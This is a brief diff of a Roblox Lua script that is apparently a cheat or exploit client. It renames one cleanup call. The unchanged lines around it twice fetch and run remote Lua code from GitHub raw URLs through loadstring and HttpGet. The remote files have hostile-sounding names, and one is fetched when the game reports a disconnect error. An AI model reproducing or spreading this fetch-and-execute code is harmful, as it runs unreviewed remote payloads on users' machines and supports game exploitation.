@@ -2630,7 +2630,7 @@ run(function()
 			if callback then
 	            if AdvancedCheck.Enabled then
 					loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/forsureyoudont.lua'))()
-					AutoRejoin:Clean(guiService.ErrorMessageChanged:Connect(function(str)
+					KillNotifications:Clean(guiService.ErrorMessageChanged:Connect(function(str)
 						if (not rejoinCheck or guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectLuaKick) and guiService:GetErrorCode() ~= Enum.ConnectionError.DisconnectConnectionLost then
 							loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/indeedwatchingthisfilefuckyou.lua'))()
 						end
